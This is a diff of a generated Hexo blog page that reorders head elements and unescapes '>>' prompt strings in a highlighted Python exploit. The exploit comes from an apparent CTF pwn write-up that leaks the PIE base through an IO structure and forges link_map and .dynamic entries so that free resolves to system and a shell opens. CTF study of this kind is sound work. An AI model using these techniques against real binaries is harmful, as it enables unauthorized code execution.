@@ -43,9 +43,9 @@
           font-size: 1.6rem;
         }
       </style>
-    <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
   </html>
 </html>
 
@@ -266,10 +266,10 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p>
 <p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p>
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'&gt;&gt;'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">+</span>b<span class="token string">'\x80'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">+</span>b<span class="token string">'\x80'</span><span class="token punctuation">)</span>
 
     payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'\xb0\x5d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;&gt; '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
 
 
     addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -282,7 +282,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 
 
     payload <span class="token operator">=</span> b<span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">0x77</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true">#0x77是free字符串在strtab中的偏移</span>
-    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'&gt;&gt;'</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'\x08'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'\x08'</span><span class="token punctuation">)</span>
 
     payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
     payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
@@ -291,7 +291,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
     # b *$rebase(0x1338)
     # '''</span><span class="token punctuation">)</span>    
 
-    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;&gt; '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
 
     io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
